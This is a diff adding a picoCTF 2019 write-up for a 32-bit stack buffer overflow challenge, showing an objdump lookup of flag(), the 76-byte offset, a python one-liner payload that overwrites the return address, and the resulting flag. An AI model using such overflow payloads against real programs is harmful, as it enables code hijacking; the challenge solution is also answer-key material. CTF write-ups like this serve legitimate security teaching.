@@ -1,0 +1,13 @@
+The overflow here aims to overwrite the return address with the address of the flag() function, which is
+0x80485e6. This can be found by running
+$ objdump -D vuln | grep flag
+080485e6 <flag>:
+ 8048618:	75 1c                	jne    8048636 <flag+0x50>
+
+ Then, we just need to input 76 (64 byte buffer + 8 bytes for EBP and EBX) to write into EIP. Given the fact that this is also
+ 32-bit, we need to make sure we input the address in little endian to correctly jump to flag().
+
+james9909@pico-2019-shell1:/problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780$ python -c "print 'A'*76 + '\xe6\x85\x04\x08'" | ./vuln
+Give me a string and lets see what happens:
+Woah, were jumping to 0x80485e6 !
+picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5c0178710}
